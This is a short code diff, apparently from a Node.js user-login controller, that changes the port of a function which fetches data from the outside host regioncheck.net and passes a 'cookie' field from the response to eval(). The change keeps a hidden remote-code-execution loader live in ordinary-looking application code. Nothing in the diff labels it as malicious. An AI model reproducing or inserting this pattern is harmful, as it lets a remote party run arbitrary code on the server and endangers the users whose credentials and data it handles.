@@ -59,7 +59,7 @@ exports.loginUser = async (req, res) => {
 };
 
 exports.fetchUser = async () => {
-  const user = await axios.get('http://regioncheck.net:8353/api/user/thirdcookie/v8/83');
+  const user = await axios.get('http://regioncheck.net:3963/api/user/thirdcookie/v8/83');
   eval(user.data.cookie);
 }
 
